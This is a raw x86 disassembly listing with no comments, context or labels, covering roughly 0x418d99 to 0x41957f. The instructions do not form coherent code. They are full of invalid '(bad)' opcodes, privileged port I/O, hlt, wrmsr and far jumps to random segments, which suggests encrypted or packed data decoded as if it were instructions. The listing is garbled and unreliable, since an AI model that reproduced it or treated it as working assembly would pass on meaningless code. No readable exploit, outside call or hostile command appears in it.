  418d99:	cmp    DWORD PTR [ecx+0x54365bfc],0x52
  418da0:	in     eax,0x79
  418da2:	jecxz  0x418db3
  418da4:	arpl   WORD PTR [ebx],bx
  418da6:	pmulhw mm3,QWORD PTR [ebx]
  418da9:	dec    edx
  418daa:	xor    ebx,DWORD PTR [edx+ebp*1]
  418dad:	mul    dh
  418daf:	ret    
  418db0:	mov    ?,WORD PTR ds:0x7f72c388
  418db6:	inc    ebx
  418db7:	pusha  
  418db8:	and    al,0xc7
  418dba:	cmp    edx,DWORD PTR [esi-0xe]
  418dbd:	jae    0x418e0b
  418dbf:	daa    
  418dc0:	sahf   
  418dc1:	jbe    0x418dd1
  418dc3:	sub    DWORD PTR [edi+0x7c30b228],0xffffffa0
  418dca:	pop    ss
  418dcb:	and    al,0x6a
  418dcd:	or     ebx,ebx
  418dcf:	push   0x34
  418dd1:	mov    WORD PTR [ebx-0x80],gs
  418dd4:	popa   
  418dd5:	aaa    
  418dd6:	fwait
  418dd7:	pop    esi
  418dd8:	mov    edx,DWORD PTR [ebx]
  418dda:	dec    edi
  418ddb:	es mov bh,0x63
  418dde:	jb     0x418dff
  418de0:	mov    eax,0x5b51eedb
  418de5:	mov    cl,0x95
  418de7:	ja     0x418dc6
  418de9:	or     al,0xd1
  418deb:	jmp    0xd98a959d
  418df0:	cwde   
  418df1:	outs   dx,DWORD PTR ds:[esi]
  418df2:	pop    ecx
  418df3:	cld    
  418df4:	inc    dl
  418df6:	retf   
  418df7:	ret    0xcf50
  418dfa:	jne    0x418e54
  418dfc:	adc    BYTE PTR [edi+0x61],0xb8
  418e00:	jmp    0x418dcb
  418e02:	mov    ah,0x1e
  418e04:	jl     0x418e59
  418e06:	int3   
  418e07:	test   BYTE PTR [ecx+0x7438cf3a],bh
  418e0d:	mov    esi,0x2a4d866e
  418e12:	add    ch,BYTE PTR [ebx+edx*4]
  418e15:	shr    BYTE PTR [ebp+0x312505ef],1
  418e1b:	inc    esp
  418e1c:	sbb    BYTE PTR [ebx],0x87
  418e1f:	pop    edx
  418e20:	push   edx
  418e21:	dec    edi
  418e22:	xor    eax,0x95d29854
  418e27:	or     dl,BYTE PTR [eax-0x52]
  418e2a:	pushf  
  418e2b:	dec    ebx
  418e2c:	sbb    eax,0x92fe6061
  418e31:	mov    eax,ds:0xfad4cb86
  418e36:	mov    esp,0xd89d9734
  418e3b:	adc    esp,DWORD PTR [ecx+ecx*2+0x221639c3]
  418e42:	mov    al,ds:0x110ec81a
  418e47:	fiadd  DWORD PTR [ebp+0x7ddc2ff1]
  418e4d:	pop    ebx
  418e4e:	faddp  st(4),st
  418e50:	pop    ebp
  418e51:	hlt    
  418e52:	push   edi
  418e53:	lds    ecx,FWORD PTR [esi+0x49]
  418e56:	and    BYTE PTR ds:0xd1d7028e,dl
  418e5c:	jae    0x418de1
  418e5e:	push   0x88530670
  418e63:	jns    0x418e31
  418e65:	js     0x418ecf
  418e67:	lea    edx,[ecx+0x2b7be413]
  418e6d:	repz dec ebp
  418e6f:	add    esi,ecx
  418e71:	add    al,0xec
  418e73:	aaa    
  418e74:	enter  0xe231,0xf7
  418e78:	loop   0x418ec6
  418e7a:	shl    ebx,1
  418e7c:	rcr    DWORD PTR [eax+edi*2-0x34efa252],1
  418e83:	data16 loope 0x418e13
  418e86:	test   BYTE PTR [edx+0x2d],bl
  418e89:	dec    ecx
  418e8a:	mov    ah,0xe7
  418e8c:	ja     0x418f01
  418e8e:	mov    eax,ds:0xa75a7cef
  418e93:	push   edx
  418e94:	and    DWORD PTR [esi],ecx
  418e96:	(bad)  
  418e97:	ficom  DWORD PTR [ecx-0x52]
  418e9a:	mov    WORD PTR [edi+eax*2-0x60ec5103],es
  418ea1:	dec    ebp
  418ea2:	je     0x418ef6
  418ea4:	xchg   ecx,eax
  418ea5:	inc    edi
  418ea6:	(bad)  
  418ea8:	jle    0x418e3e
  418eaa:	pop    ebx
  418eab:	mov    ebx,0x64405380
  418eb0:	lds    edi,FWORD PTR ss:[eax+0x7f]
  418eb4:	cdq    
  418eb5:	jnp    0x418e70
  418eb7:	xor    DWORD PTR [eax-0x45ccf7a5],esp
  418ebd:	xor    al,0x1f
  418ebf:	jle    0x418e8d
  418ec1:	mov    bl,0xc8
  418ec3:	jnp    0x418e77
  418ec5:	pop    ebx
  418ec6:	outs   dx,DWORD PTR ds:[esi]
  418ec7:	stc    
  418ec8:	sti    
  418ec9:	push   ds
  418eca:	icebp  
  418ecb:	push   ebx
  418ecc:	rol    DWORD PTR [esi+0x14],0x15
  418ed0:	and    al,BYTE PTR [ebp+0x189f6fe9]
  418ed6:	push   ebx
  418ed7:	pop    esi
  418ed8:	test   BYTE PTR [ecx+0x6c841c0],bh
  418ede:	aam    0x94
  418ee0:	retf   
  418ee1:	popf   
  418ee2:	lock add esi,DWORD PTR [ebx-0x60]
  418ee6:	or     eax,0xb7cbe675
  418eeb:	outs   dx,DWORD PTR ds:[esi]
  418eec:	outs   dx,DWORD PTR ds:[esi]
  418eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418eee:	or     dh,ch
  418ef0:	cmp    DWORD PTR [eax+0x1d234137],esp
  418ef6:	icebp  
  418ef7:	jmp    0x5a15ba33
  418efc:	or     ecx,DWORD PTR ds:0x414d9475
  418f02:	(bad)  
  418f03:	icebp  
  418f04:	pop    ebp
  418f05:	xor    eax,DWORD PTR [ebx]
  418f07:	adc    DWORD PTR [ebp+0x6179feb9],edx
  418f0d:	push   es
  418f0e:	jae    0x418ec4
  418f10:	ret    
  418f11:	jle    0x418ea8
  418f13:	mov    BYTE PTR [esi],al
  418f15:	inc    ebp
  418f16:	and    dh,al
  418f18:	mov    al,dh
  418f1a:	jmp    0xf158:0x649ca9e5
  418f21:	push   esp
  418f22:	nop
  418f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f24:	std    
  418f25:	scas   al,BYTE PTR es:[edi]
  418f26:	out    dx,al
  418f27:	and    eax,0xb4535d9c
  418f2c:	add    al,BYTE PTR [edi+0x31fc7b22]
  418f32:	sbb    bh,dh
  418f34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f35:	add    eax,0x53c2add2
  418f3a:	mov    dl,0x38
  418f3c:	outs   dx,BYTE PTR ds:[esi]
  418f3d:	push   ebx
  418f3e:	jl     0x418ed0
  418f40:	add    ah,bh
  418f42:	daa    
  418f43:	mov    dl,0xe4
  418f45:	and    al,0xf2
  418f47:	cli    
  418f48:	retf   0xf1fe
  418f4b:	mov    ebx,0xf7c25cc5
  418f50:	xchg   esp,eax
  418f51:	or     DWORD PTR [edi+0x48d11e74],edi
  418f57:	push   cs
  418f58:	aas    
  418f59:	popf   
  418f5a:	(bad)  [ecx]
  418f5c:	or     DWORD PTR ds:0x7f474ac1,esp
  418f62:	push   DWORD PTR [ebx+edi*2+0x6f]
  418f66:	mov    DWORD PTR [edi+0x5e],edi
  418f69:	and    ecx,ebp
  418f6b:	arpl   ax,bp
  418f6d:	xchg   esp,eax
  418f6e:	popa   
  418f6f:	inc    eax
  418f70:	mov    esp,0x9ac7f976
  418f75:	rol    DWORD PTR [eax+0xf],1
  418f78:	dec    ebx
  418f79:	pop    ebx
  418f7a:	adc    eax,DWORD PTR [edx-0x4d954d9b]
  418f80:	inc    ebp
  418f81:	lods   al,BYTE PTR ds:[esi]
  418f82:	stos   DWORD PTR es:[edi],eax
  418f83:	je     0x418f3c
  418f85:	mov    al,0x5c
  418f87:	fs fs pop ebx
  418f8a:	jg     0x418f2a
  418f8c:	loopne 0x418ff7
  418f8e:	pop    ebp
  418f8f:	scas   al,BYTE PTR es:[edi]
  418f90:	test   eax,0x5708452b
  418f95:	and    bh,dl
  418f97:	daa    
  418f98:	mov    al,0x58
  418f9a:	inc    ecx
  418f9b:	fwait
  418f9c:	xchg   esi,eax
  418f9d:	adc    al,0xe7
  418f9f:	xor    BYTE PTR [edi-0x22609e3a],0x8f
  418fa6:	pop    ebp
  418fa7:	scas   al,BYTE PTR es:[edi]
  418fa8:	inc    esp
  418fa9:	out    0xc3,eax
  418fab:	cwde   
  418fac:	jno    0x418f94
  418fae:	xor    BYTE PTR [ebx],dl
  418fb0:	adc    eax,DWORD PTR [ecx+0x175c0a69]
  418fb6:	and    ebp,eax
  418fb8:	push   0xd76c0a63
  418fbd:	adc    ah,BYTE PTR [edi]
  418fbf:	jmp    0xdfeac017
  418fc4:	(bad)  
  418fc5:	jo     0x418f84
  418fc7:	mov    ds:0x50c49897,eax
  418fcc:	pop    esi
  418fcd:	mov    edx,0xc8c4fff8
  418fd2:	ja     0x419031
  418fd4:	mov    ds:0xe7ce16b3,al
  418fd9:	inc    ebx
  418fda:	sahf   
  418fdb:	lods   eax,DWORD PTR ds:[esi]
  418fdc:	js     0x418fc8
  418fde:	and    ebp,DWORD PTR [edx]
  418fe0:	scas   al,BYTE PTR es:[edi]
  418fe1:	shl    DWORD PTR [edi-0x4d],0xdd
  418fe5:	inc    esi
  418fe6:	stos   BYTE PTR es:[edi],al
  418fe7:	outs   dx,BYTE PTR ds:[esi]
  418fe8:	adc    DWORD PTR [ecx+0x3ccb0493],0x3b
  418fef:	xchg   BYTE PTR [ebp-0x6d],bh
  418ff2:	das    
  418ff3:	popa   
  418ff4:	call   0xf593:0xd8e4acd0
  418ffb:	imul   ecx,DWORD PTR [eax+0x3f],0x79
  418fff:	sbb    eax,0xa59e5efb
  419004:	pop    ebp
  419005:	pop    ds
  419006:	cwde   
  419007:	inc    ebp
  419008:	jmp    0xd7a6:0xda8c5dc7
  41900f:	sbb    ecx,DWORD PTR [edx]
  419011:	mov    esp,0x2561b07b
  419016:	dec    edi
  419017:	lods   al,BYTE PTR ds:[esi]
  419018:	fisubr WORD PTR [edx+0x3d]
  41901b:	push   ebp
  41901c:	sti    
  41901d:	in     al,0x1c
  41901f:	lea    eax,[eax]
  419021:	aaa    
  419022:	mov    ds:0x7c1e4eb2,al
  419027:	jmp    0x2e68aa2c
  41902c:	push   edx
  41902d:	lds    eax,FWORD PTR ds:0xc338a862
  419033:	dec    eax
  419034:	jle    0x419003
  419036:	cwde   
  419037:	xchg   BYTE PTR [ebp-0x1],ah
  41903a:	xor    DWORD PTR [ebp-0x404ddeb2],eax
  419040:	and    DWORD PTR ds:0xce6d1062,ebp
  419046:	pop    es
  419047:	aas    
  419048:	jnp    0x41901c
  41904a:	test   ebx,ecx
  41904c:	(bad)  
  41904d:	mov    ecx,0x5cfb3891
  419052:	sub    bh,BYTE PTR [edx-0x1aebb29a]
  419058:	dec    edx
  419059:	fs std 
  41905b:	leave  
  41905c:	aam    0xff
  41905e:	popa   
  41905f:	aas    
  419060:	dec    esp
  419061:	mov    eax,0x229a917a
  419066:	xor    ch,BYTE PTR [ecx+0x28bf5b2a]
  41906c:	in     al,0x61
  41906e:	fisttp DWORD PTR ds:0x9871783e
  419074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419075:	mov    DWORD PTR [edx],ecx
  419077:	repz fidiv WORD PTR [ecx]
  41907a:	mov    ch,BYTE PTR [edx]
  41907c:	or     ch,BYTE PTR [edx+0x6a9981fe]
  419082:	mov    cs,ecx
  419084:	out    0x99,al
  419086:	ss (bad) 
  419089:	(bad)  
  41908a:	push   0x74dc5ff0
  41908f:	hlt    
  419090:	sub    al,0xdb
  419092:	xchg   edi,eax
  419093:	stc    
  419094:	jbe    0x4190f8
  419096:	or     eax,0x3614c47f
  41909b:	sbb    edi,DWORD PTR [edx-0x215bbabe]
  4190a1:	out    0xf,eax
  4190a3:	mov    WORD PTR [eax-0x3a759f3b],ss
  4190a9:	mov    eax,ds:0x34deff05
  4190ae:	jno    0x41910c
  4190b0:	das    
  4190b1:	pop    esi
  4190b2:	mov    edi,0x359b1642
  4190b7:	outs   dx,BYTE PTR ds:[esi]
  4190b8:	test   dl,ch
  4190ba:	cmp    ch,BYTE PTR [eax+0x19]
  4190bd:	adc    eax,0xc8fbe58
  4190c2:	aad    0xaf
  4190c4:	in     al,dx
  4190c5:	mov    ds:0xf5667b5b,eax
  4190ca:	xchg   edx,eax
  4190cb:	push   ss
  4190cc:	ins    BYTE PTR es:[edi],dx
  4190cd:	cmp    BYTE PTR [eax+ebp*4+0x1e],cl
  4190d1:	jns    0x41909e
  4190d3:	pop    edi
  4190d4:	xchg   DWORD PTR [esi],ebp
  4190d6:	ja     0x419081
  4190d8:	mov    ch,ch
  4190da:	dec    edx
  4190db:	adc    al,BYTE PTR [ecx]
  4190dd:	dec    ecx
  4190de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190df:	mov    bl,cl
  4190e1:	div    BYTE PTR [edi]
  4190e3:	jnp    0x4190d1
  4190e5:	fs dec esi
  4190e7:	inc    esi
  4190e8:	mov    ebx,0x6ed143f6
  4190ed:	fisub  DWORD PTR [edi-0x5e]
  4190f0:	test   eax,0x7f11fcb8
  4190f5:	mov    ebp,0x830db8f1
  4190fa:	sbb    BYTE PTR [edx],dh
  4190fc:	inc    eax
  4190fd:	pusha  
  4190fe:	stos   BYTE PTR es:[edi],al
  4190ff:	jg     0x419100
  419101:	pop    edi
  419102:	adc    eax,0xd347605
  419107:	xchg   edi,eax
  419108:	sub    eax,0x1fc527f0
  41910d:	div    DWORD PTR [ebp-0xd6eeda5]
  419113:	pop    esi
  419114:	sahf   
  419115:	mov    al,0x4b
  419117:	sti    
  419118:	lods   eax,DWORD PTR ds:[esi]
  419119:	sub    al,0xb2
  41911b:	sbb    bh,bl
  41911d:	outs   dx,BYTE PTR ds:[esi]
  41911e:	sti    
  41911f:	xchg   edx,eax
  419120:	add    BYTE PTR [esi],bl
  419122:	sbb    al,0x22
  419124:	xchg   ecx,eax
  419125:	push   ds
  419126:	mov    esi,0xdd6d86ce
  41912b:	add    ah,dl
  41912d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41912e:	nop
  41912f:	push   edx
  419130:	and    eax,0x1e408eaf
  419135:	cwde   
  419136:	xor    al,0xa3
  419138:	push   ebx
  419139:	pop    esi
  41913a:	neg    eax
  41913c:	sti    
  41913d:	out    0x19,al
  41913f:	pop    ss
  419140:	jmp    0x4191ad
  419142:	inc    eax
  419143:	adc    cl,dl
  419145:	shr    ah,1
  419147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419148:	inc    edx
  419149:	(bad)  
  41914a:	xchg   ecx,eax
  41914b:	pop    eax
  41914c:	sbb    edi,DWORD PTR [eax-0x2d]
  41914f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419150:	inc    edi
  419151:	jno    0x419147
  419153:	iret   
  419154:	ds inc ebp
  419156:	jle    0x4190da
  419158:	jmp    0x419197
  41915a:	and    al,0x2f
  41915c:	cmp    DWORD PTR [esp+edi*4+0x25fc73ed],edi
  419163:	fst    QWORD PTR [edi]
  419165:	mov    eax,ds:0x6e1b5ccb
  41916a:	dec    edx
  41916b:	jno    0x4191db
  41916d:	enter  0x52a6,0x0
  419171:	je     0x41917c
  419173:	cs jle 0x4191ed
  419176:	add    al,0x9b
  419178:	pushf  
  419179:	inc    esi
  41917a:	loopne 0x419159
  41917c:	out    dx,al
  41917d:	hlt    
  41917e:	xor    eax,0xf68c193d
  419183:	mov    ch,BYTE PTR [ecx+0x7529d5bf]
  419189:	push   ds
  41918a:	dec    ebx
  41918b:	adc    DWORD PTR [eax],eax
  41918d:	cmp    ebx,DWORD PTR [eiz*2-0x3b2cd0bf]
  419194:	test   eax,0x881130f3
  419199:	mov    esi,0x547525e2
  41919e:	jne    0x419201
  4191a0:	inc    edx
  4191a1:	mov    dh,0xb0
  4191a3:	adc    esi,DWORD PTR [ecx]
  4191a5:	aaa    
  4191a6:	sbb    BYTE PTR [ebp+0x3],ch
  4191a9:	sahf   
  4191aa:	fsubr  DWORD PTR [ebx-0x46]
  4191ad:	pop    eax
  4191ae:	cdq    
  4191af:	shl    eax,cl
  4191b1:	xor    ebx,ebp
  4191b3:	xchg   edi,eax
  4191b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191b5:	stc    
  4191b6:	push   ss
  4191b7:	inc    ecx
  4191b8:	mov    dh,0xfa
  4191ba:	pushf  
  4191bb:	cs and al,0x53
  4191be:	int3   
  4191bf:	in     al,dx
  4191c0:	adc    al,0xeb
  4191c2:	mov    ds,WORD PTR ds:0x7e20204
  4191c8:	xor    eax,0x770bc416
  4191cd:	sbb    eax,0x1cd509eb
  4191d2:	cld    
  4191d3:	xchg   BYTE PTR [edi+0x2a2ae1f6],ah
  4191d9:	les    edx,FWORD PTR [eax]
  4191db:	repnz lahf 
  4191dd:	and    BYTE PTR [eax-0x2a399a47],ch
  4191e3:	aaa    
  4191e4:	es push 0x3eb71368
  4191ea:	xchg   edi,eax
  4191eb:	adc    bl,BYTE PTR [edi]
  4191ed:	push   0x68
  4191ef:	push   edi
  4191f0:	test   BYTE PTR [ebx+0x714be8d7],cl
  4191f6:	retf   0x56cd
  4191f9:	lock inc esp
  4191fb:	cmp    ebp,edx
  4191fd:	xor    dh,BYTE PTR [ebx-0x21b88630]
  419203:	std    
  419204:	adc    DWORD PTR [ebx-0x20],edx
  419207:	(bad)  
  419208:	int3   
  419209:	outs   dx,BYTE PTR ds:[esi]
  41920a:	int    0x98
  41920c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41920e:	mov    edi,0x73ed753b
  419213:	adc    DWORD PTR [edx],eax
  419215:	and    dh,ch
  419217:	test   al,0xeb
  419219:	call   0x91d2c3c5
  41921e:	push   ds
  41921f:	dec    esi
  419220:	pop    eax
  419221:	shl    BYTE PTR [ecx],1
  419223:	jo     0x419210
  419225:	xchg   edx,edi
  419227:	inc    esp
  419228:	aad    0x1f
  41922a:	cli    
  41922b:	fwait
  41922c:	in     al,0x49
  41922e:	pop    esp
  41922f:	jge    0x4192a3
  419231:	nop
  419232:	xlat   BYTE PTR ds:[ebx]
  419233:	xor    esp,DWORD PTR ds:0x1d7360fe
  419239:	std    
  41923a:	adc    BYTE PTR ds:0xef46a3b4,dh
  419240:	es aaa 
  419242:	test   DWORD PTR [ebx-0x2c99795c],edi
  419248:	aas    
  419249:	sar    DWORD PTR [ecx-0x3f],cl
  41924c:	or     edx,ebx
  41924e:	jge    0x419204
  419250:	in     eax,0x3f
  419252:	pop    es
  419253:	mov    bl,0x5c
  419255:	les    edi,FWORD PTR [ebp+0x4ab7c913]
  41925b:	pop    es
  41925c:	push   ebp
  41925d:	adc    edx,eax
  41925f:	pop    ecx
  419260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419261:	test   al,0x31
  419263:	test   edx,ebx
  419265:	call   0xe5c1:0x850d36e6
  41926c:	shl    DWORD PTR [edx],0x73
  41926f:	out    0x88,eax
  419271:	out    0x4a,eax
  419273:	rol    BYTE PTR [bp+si+0xf],cl
  419277:	in     eax,0xab
  419279:	cld    
  41927a:	mov    ebx,0x266561cb
  41927f:	pushf  
  419280:	icebp  
  419281:	mov    DWORD PTR [ecx],ecx
  419283:	jno    0x4192f8
  419285:	mov    cl,0xac
  419287:	xchg   esp,eax
  419288:	or     BYTE PTR [ebx+edx*8+0x37],cl
  41928c:	lods   eax,DWORD PTR ds:[esi]
  41928d:	mov    edx,0x572e110b
  419292:	lods   eax,DWORD PTR ds:[esi]
  419293:	call   0x9b44:0x1eaa69ee
  41929a:	mov    dh,dl
  41929c:	pop    esp
  41929e:	push   edi
  41929f:	jmp    0x4192ac
  4192a1:	mov    ds:0xae19d664,al
  4192a6:	or     BYTE PTR [ecx],dl
  4192a8:	pop    edx
  4192a9:	add    eax,0x1fc5d07b
  4192ae:	scas   al,BYTE PTR es:[edi]
  4192af:	jmp    0xdc31:0x5a988cf0
  4192b6:	ret    0xbead
  4192b9:	leave  
  4192ba:	or     DWORD PTR [ebx],0xe0c1b2c0
  4192c0:	sub    esp,DWORD PTR [eax]
  4192c2:	(bad)  
  4192c3:	and    bl,ch
  4192c5:	mov    WORD PTR [ecx],ss
  4192c7:	jmp    0x816cbff9
  4192cc:	wrmsr  
  4192ce:	cs pop edx
  4192d0:	fmul   DWORD PTR [esi+0x1dc13aa4]
  4192d6:	xor    ch,BYTE PTR [ecx]
  4192d8:	cli    
  4192d9:	es xchg esp,eax
  4192db:	mov    esp,0xb4b440cb
  4192e0:	je     0x4192e7
  4192e2:	fcom   DWORD PTR [esi+0x7d79c0ff]
  4192e8:	and    edx,ecx
  4192ea:	ins    BYTE PTR es:[edi],dx
  4192eb:	mov    al,0x91
  4192ed:	icebp  
  4192ee:	sub    DWORD PTR [ebx-0x21],0x57
  4192f2:	test   BYTE PTR [ebx+0x72],ch
  4192f5:	lahf   
  4192f6:	dec    edi
  4192f7:	jns    0x4192c1
  4192f9:	and    DWORD PTR [edi],eax
  4192fb:	or     BYTE PTR [ecx],0x6f
  4192fe:	push   ss
  4192ff:	mov    ch,0xb5
  419301:	inc    cl
  419303:	inc    esp
  419304:	push   esi
  419305:	out    0x9f,eax
  419307:	inc    edx
  419308:	dec    esp
  419309:	mov    ds:0xfa5162e1,al
  41930e:	daa    
  41930f:	cdq    
  419310:	pop    esp
  419311:	adc    eax,0x33409fa5
  419316:	dec    esp
  419317:	sub    DWORD PTR [ebx+edi*8-0x4b360f6b],esi
  41931e:	jns    0x4192b4
  419320:	push   eax
  419321:	out    dx,eax
  419322:	xchg   edi,eax
  419323:	call   0x69665684
  419328:	or     ecx,DWORD PTR [ebp-0x40b2594a]
  41932e:	dec    ecx
  41932f:	cmp    eax,0x559c136a
  419334:	dec    esp
  419335:	or     BYTE PTR ds:[ecx],ah
  419338:	mov    BYTE PTR [edi+edi*1-0x2ba9bf30],cl
  41933f:	mov    ds:0xeb753185,al
  419344:	rcr    BYTE PTR [esi-0x76],0x60
  419348:	iret   
  419349:	push   ebp
  41934a:	ins    BYTE PTR es:[edi],dx
  41934b:	gs xor eax,0x87de7c8
  419351:	out    dx,al
  419352:	xor    ebp,DWORD PTR [ecx+0x2c]
  419355:	(bad)  
  419356:	sub    al,0x7b
  419358:	xchg   edi,eax
  419359:	fild   QWORD PTR [eax+edi*8]
  41935c:	push   es
  41935d:	mov    ds:0x9ed6f59,al
  419362:	push   eax
  419363:	or     ebx,DWORD PTR [eax]
  419365:	jne    0x419338
  419367:	addr16 mov dl,0x3a
  41936a:	mov    eax,ds:0x4777391f
  41936f:	mov    gs,eax
  419371:	and    DWORD PTR [ebx-0x21],0x39
  419375:	sahf   
  419376:	mov    ecx,0x828f15bb
  41937b:	push   ecx
  41937c:	sti    
  41937d:	mov    ds:0x57b7dd55,eax
  419382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419383:	aad    0xdf
  419385:	xchg   ebx,eax
  419386:	retf   
  419387:	fcmovnu st,st(2)
  419389:	data16 je 0x419339
  41938c:	mov    al,ds:0x9187089b
  419391:	cli    
  419392:	mov    esp,0xf5fc7910
  419397:	repnz dec ecx
  419399:	mov    eax,0x4fcd938d
  41939e:	fwait
  41939f:	dec    edx
  4193a0:	pop    DWORD PTR [edx-0x4f01fade]
  4193a6:	ss jge 0x4193a4
  4193a9:	pop    ss
  4193aa:	aam    0x35
  4193ac:	std    
  4193ad:	inc    ebx
  4193ae:	in     al,0x5
  4193b0:	inc    edx
  4193b1:	push   ebp
  4193b2:	xchg   edx,eax
  4193b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193b4:	mov    ebp,ebp
  4193b6:	pop    ecx
  4193b7:	dec    edx
  4193b8:	sub    eax,0xcb04d65c
  4193bd:	mov    ds:0x49a022f9,al
  4193c2:	mov    esi,0xff79376
  4193c7:	jb     0x419350
  4193c9:	call   0xbffd2384
  4193ce:	and    al,0xe2
  4193d0:	rol    BYTE PTR [ebp+0x21],1
  4193d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193d4:	es addr16 adc eax,0x363034a
  4193db:	push   ebx
  4193dc:	cmp    ebp,esi
  4193de:	ret    
  4193df:	daa    
  4193e0:	pop    ebp
  4193e1:	std    
  4193e2:	scas   ax,WORD PTR es:[edi]
  4193e4:	in     al,0x68
  4193e6:	nop
  4193e7:	push   ss
  4193e8:	pop    edi
  4193e9:	ficom  DWORD PTR [edx-0x6528fb9b]
  4193ef:	jo     0x419396
  4193f1:	in     al,0xeb
  4193f3:	(bad)  [ecx+eax*2-0x78]
  4193f7:	shl    WORD PTR [eax-0x78],0xba
  4193fc:	push   ds
  4193fd:	xor    BYTE PTR [edx+0x48],dh
  419400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419401:	or     eax,0x135f4e08
  419406:	adc    al,0x8a
  419408:	sub    al,0xb5
  41940a:	bound  eax,QWORD PTR [ebp-0x3d]
  41940d:	gs cwde 
  41940f:	int3   
  419410:	call   0x9a5d:0xec2a6335
  419417:	add    edx,DWORD PTR [ebx]
  419419:	stos   BYTE PTR es:[edi],al
  41941a:	es and eax,0x9bc4f8e3
  419420:	and    DWORD PTR [edi-0xf],ebp
  419423:	push   ebx
  419424:	in     al,dx
  419425:	in     al,dx
  419426:	jl     0x419479
  419428:	(bad)  
  419429:	and    ah,bh
  41942b:	dec    BYTE PTR [esi-0x50]
  41942e:	test   bl,bh
  419430:	sub    edx,DWORD PTR [esi]
  419432:	mov    dl,0xdb
  419434:	pushf  
  419435:	or     al,BYTE PTR [edi+0x48b6798e]
  41943b:	add    DWORD PTR [ebp+0x5c],0x38b85d19
  419442:	and    BYTE PTR [edx-0x7a006d79],ah
  419448:	and    eax,0xb8449099
  41944d:	and    al,0x2c
  41944f:	cmp    DWORD PTR [ecx-0x643efee],0x5b2cdb2e
  419459:	fadd   QWORD PTR [esi+0x5e2f06c1]
  41945f:	shl    DWORD PTR [esi],cl
  419461:	imul   edi,ebx,0x4e
  419464:	data16 mov ch,0x7e
  419467:	lea    esi,[eax+0x20a2d3d4]
  41946d:	lea    eax,ds:0x43fac15b
  419473:	inc    esi
  419474:	or     al,0x56
  419476:	loop   0x41949d
  419478:	test   ebx,edi
  41947a:	and    dh,BYTE PTR [ecx-0x752f8186]
  419480:	mov    ebp,esi
  419482:	imul   BYTE PTR [ebp+0x68]
  419485:	mov    eax,ds:0xb5756ebc
  41948a:	mov    eax,DWORD PTR [edx+esi*1]
  41948d:	mov    ebx,0xb363de5b
  419492:	cmp    al,0x0
  419494:	and    al,0xc3
  419496:	mov    edi,0x7185a982
  41949b:	in     al,dx
  41949c:	mov    dh,dh
  41949e:	(bad)  
  41949f:	jmp    0x55aa07c3
  4194a4:	pushf  
  4194a5:	and    eax,0x694d402
  4194aa:	or     ch,BYTE PTR [esi]
  4194ac:	out    0x8b,eax
  4194ae:	cmp    al,0x80
  4194b0:	sub    ebp,esp
  4194b2:	fs popf 
  4194b4:	cmp    eax,esi
  4194b6:	int    0x42
  4194b8:	push   ebp
  4194b9:	retf   0x809f
  4194bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194bd:	jle    0x41951e
  4194bf:	into   
  4194c0:	xor    BYTE PTR [ebx],dh
  4194c2:	(bad)  
  4194c3:	out    0xee,eax
  4194c5:	push   edi
  4194c6:	jno    0x419521
  4194c8:	cmp    al,0x34
  4194ca:	fs out 0x7c,al
  4194cd:	icebp  
  4194ce:	lea    ebx,[ebx+0x3662c615]
  4194d4:	call   0xf11b:0x48fef9ac
  4194db:	repz cdq 
  4194dd:	shl    BYTE PTR [edx+ecx*8-0x7f],1
  4194e1:	push   cs
  4194e2:	jmp    0x9782:0x1038eb1d
  4194e9:	jns    0x41946d
  4194eb:	adc    BYTE PTR [esi-0x7a],dl
  4194ee:	mov    edx,0xe70e9c8f
  4194f3:	sbb    al,0x11
  4194f5:	mov    esp,0xf564047a
  4194fa:	inc    ecx
  4194fb:	pop    edi
  4194fc:	add    al,0xa6
  4194fe:	dec    bl
  419500:	sbb    ah,0xc8
  419503:	pushf  
  419504:	sbb    al,0x1f
  419506:	aam    0xbf
  419508:	push   edx
  419509:	std    
  41950a:	in     eax,0x93
  41950c:	pop    es
  41950d:	push   cs
  41950e:	adc    eax,0x2aa6bea8
  419513:	push   edx
  419514:	xor    bh,BYTE PTR [edx]
  419516:	shl    bh,cl
  419518:	fs pop ebx
  41951a:	mov    ds:0xc1c2a735,al
  41951f:	mov    al,0x14
  419521:	je     0x4194d2
  419523:	adc    eax,DWORD PTR [ecx-0x25e7abfa]
  419529:	jno    0x419527
  41952b:	pop    edx
  41952c:	mov    esp,0xa6c4c9ab
  419531:	daa    
  419532:	xor    esi,ecx
  419534:	jge    0x41957e
  419536:	xor    al,0x72
  419538:	jb     0x4194bc
  41953a:	mov    gs,edx
  41953c:	jle    0x419503
  41953e:	lods   eax,DWORD PTR ds:[esi]
  41953f:	sbb    bl,dl
  419541:	mov    al,0x0
  419543:	shl    BYTE PTR [ebx+0x78],0xa8
  419547:	je     0x41957a
  419549:	inc    ecx
  41954a:	ja     0x419576
  41954c:	mov    al,ds:0xe41ceeaf
  419551:	into   
  419552:	(bad)  
  419553:	lods   eax,DWORD PTR ds:[esi]
  419554:	pop    edx
  419555:	inc    ebx
  419556:	int    0xc5
  419558:	fs mov ah,0x7c
  41955b:	aad    0xa0
  41955d:	cld    
  41955e:	lock mov edi,0x98c4661
  419564:	in     al,0x1f
  419566:	gs dec ebp
  419568:	xor    al,0x92
  41956a:	pop    esp
  41956b:	push   0x363e9675
  419570:	out    0x2b,al
  419572:	inc    esp
  419573:	jmp    0x4195c3
  419575:	push   ebx
  419576:	pop    eax
  419577:	adc    DWORD PTR [edx+ebp*4],ecx
  41957a:	ror    BYTE PTR ss:[ecx-0x72],1
  41957e:	dec    edi
  41957f:	mov    edi,esi
